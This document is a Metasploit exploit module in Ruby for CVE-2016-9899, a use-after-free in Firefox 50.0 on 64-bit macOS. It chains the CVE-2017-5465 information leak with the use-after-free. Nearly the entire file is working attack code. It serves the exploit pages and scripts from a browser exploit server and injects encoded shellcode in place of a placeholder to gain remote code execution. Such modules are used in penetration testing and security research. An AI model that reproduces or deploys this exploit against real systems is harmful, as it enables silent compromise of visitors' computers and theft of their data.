##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "Firefox audio events RCE",
      'Description'    => %q{
        This module exploits an UAF vulnrability present in nsNodeUtils::CloneAndAdopt function.
        It is exploiting the vulnrability using an adding and immediately removing audio elements.
        The exploit is built for the exact versions (50.0.X x64) under OSX and requires and information disclosure.
        The information disclosure used in this module is cve-2017-5465. Need at least 4 GB of ram (the more the better).
        Might take a few minutes.
        },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'dcodeIO',             # Stand-alone version for long.js
          'echo',                # Original vulnrability reporter
          'Marcin Ressel',       # Reliable POC exploiting the vulnrability
          'bcook-r7'             # Module import
        ],
      'Platform'       => 'osx',
      'BrowserRequirements' =>
        {
          source:  /script/i,
          os_name: OperatingSystems::Match::MAC_OSX,
          ua_name: HttpClients::FF,
          # Fixed in Firefox 50.1 TODO check the version
          ua_ver: "50.0"
        },
      'Targets'        =>
        [
          [
            'Mozilla Firefox 50.0', {
              'Platform' => 'osx',
              'Arch'     => ARCH_X64
            }
          ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => "thread",
          'InitialAutoRunScript' => 'migrate -f'
        },
      'References'     =>
        [
          ['CVE', '2016-9899'],
          ['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=1306628'],
          ['EDB', '41042'],
          ['URL', 'https://github.com/dcodeIO/long.js']
        ],
      'DisclosureDate' => "Sep 30 2016",
      'DefaultTarget'  => 0
    )
    )
  end

  def send_audio_events_dom_uaf(cli)
    # If you want to change the apperance of the landing page, do it here
    # but you have to keep the iframe called t1 and keep the svg in there.

    html = %(
    <html>
    <head>
      <title>cve-2016-9899</title>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta http-equiv="Expires" content="0" />
      <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
      <meta http-equiv="Cache-Control" content="post-check=0, pre-check=0" />
      <meta http-equiv="Pragma" content="no-cache" />
      <meta charset="utf-8"/>
      <script src="Long.js"></script>
      <script src="cve-2016-9899.js"></script>
    </head>
    <body>
      <svg width="1" height="1" viewPort="0 0 1 1" version="1.1" xmlns="http://www.w3.org/2000/svg">
        <rect id="anirect2" x="1" y="1" width="1" height="1">
        </rect>
      </svg>
      <iframe src="about:blank" id="t1" width="0" height="0" frameBorder ="0"></iframe>
    </body>
    </html>
    )
    send_response(cli, html, 'Content-Type' => 'text/html', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close')
  end

  def send_info_leak(cli)
    js = File.binread(File.join(Msf::Config.data_directory, "exploits", "cve-2017-5465", "cve-2017-5465.js"))
    js.gsub!("NEXTSTAGEURLPLEASE", "audio_events_dom_uaf.html?xul=")

    # If you want to change the apperance of the landing page, do it here.
    # but you have to keep the svg in here.

    html = %(
    <html>
    <head>
      <title>cve-2017-5465</title>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta http-equiv="Expires" content="0" />
      <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
      <meta http-equiv="Cache-Control" content="post-check=0, pre-check=0" />
      <meta http-equiv="Pragma" content="no-cache" />
      <script src="Long.js"></script>
      <script>
        #{js}
      </script>
    </head>
    <body>
      <svg width="1" height="1" viewPort="0 0 1 1" version="1.1" xmlns="http://www.w3.org/2000/svg">
        <rect id="anirect2" x="1" y="1" width="1" height="1">
        </rect>
      </svg>
    </body>
    </html>
    )
    send_response(cli, html, 'Content-Type' => 'text/html', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close')
  end

  def long_js(cli)
    print_status("Sending long.js now")
    l_c = File.binread(File.join(Msf::Config.data_directory, "exploits", "firefox_audio_events_dom_uaf", "long.js"))
    send_response(cli, l_c, 'Content-Type' => 'text/javascript', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close')
  end

  def worker_js(cli)
    print_status("Sending worker.js now")
    l_c = File.binread(File.join(Msf::Config.data_directory, "exploits", "firefox_audio_events_dom_uaf", "Worker.js"))
    send_response(cli, l_c, 'Content-Type' => 'text/javascript', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close')
  end

  def audio_uaf_js(cli)
    print_status("Sending cve-2016-9899.js now")
    l_c = File.binread(File.join(Msf::Config.data_directory, "exploits", "firefox_audio_events_dom_uaf", "cve-2016-9899.js"))
    p = payload.encoded
    arch = Rex::Arch.endian(target.arch)
    payload = Rex::Text.to_unescape(p, arch)
    l_c = l_c.gsub("INSERTSHELLCODEHEREPLZ", payload)
    send_response(cli, l_c, 'Content-Type' => 'text/javascript', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close')
  end

  def on_request_exploit(cli, request, _browser_info)
    print_status("Got request: #{request.uri}")
    print_status("From: #{request.headers['User-Agent']}")

    if request.uri =~ /audio_events_dom_uaf\.html/
      print_status("Sending audio_events_dom_uaf exploit")
      send_audio_events_dom_uaf(cli)
      return
    end

    if request.uri =~ /Long\.js/
      print_status("Sending long.js")
      long_js(cli)
      return
    end

    if request.uri =~ /Worker\.js/
      print_status("Sending worker.js")
      worker_js(cli)
      return
    end

    if request.uri =~ /cve-2016-9899\.js/
      print_status("Sending cve-2016-9899 js exploit!")
      audio_uaf_js(cli)
      return
    end

    if request.uri =~ /index\.html/ || request.uri =~ /\//
      print_status("Sending info leak (cve-2017-5465)")
      send_info_leak(cli)
      return
    end
  end
end
